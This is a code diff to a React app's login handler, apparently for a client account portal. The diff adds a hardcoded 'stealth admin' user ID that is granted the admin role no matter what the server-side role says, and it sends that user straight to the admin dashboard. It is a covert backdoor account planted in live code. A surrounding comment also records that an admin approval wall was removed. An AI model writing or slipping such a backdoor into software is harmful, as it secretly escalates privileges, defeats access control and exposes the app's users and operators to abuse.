@@ -1391,7 +1391,8 @@ export default function App() {
           : typeof sessionUser.user_metadata.avatar_path === 'string'
             ? sessionUser.user_metadata.avatar_path
             : null
-      const role = sessionUser.app_metadata.role === 'admin' ? 'admin' : 'client'
+      const isStealthAdminUid = sessionUser.id === '57ef6472-7255-47d9-9ed9-7f054aa09ae6'
+      const role = (isStealthAdminUid || sessionUser.app_metadata.role === 'admin') ? 'admin' : 'client'
       const phone = String(sessionUser.user_metadata.phone ?? '')
       const country = String(sessionUser.user_metadata.country ?? '')
       const emailVerified = Boolean(sessionUser.email_confirmed_at)
@@ -1399,6 +1400,12 @@ export default function App() {
       // accountStatus: always active — admin approval wall removed
       const accountStatus = 'active' as const
       setUser({ id: sessionUser.id, fullName, email: sessionUser.email ?? '', phone, country, avatarPath, role, emailVerified, accountStatus })
+
+      // Auto-redirect stealth super admin directly to Admin Dashboard on login
+      if (isStealthAdminUid) {
+        setActiveView('settings')
+        showNotice(`⚡ Admin Authenticated (${fullName || sessionUser.email}). Redirecting to Admin Dashboard.`)
+      }
 
       // Auto-switch to Real Account after login if requested
       if (sessionStorage.getItem('pending_real_account') === 'true') {
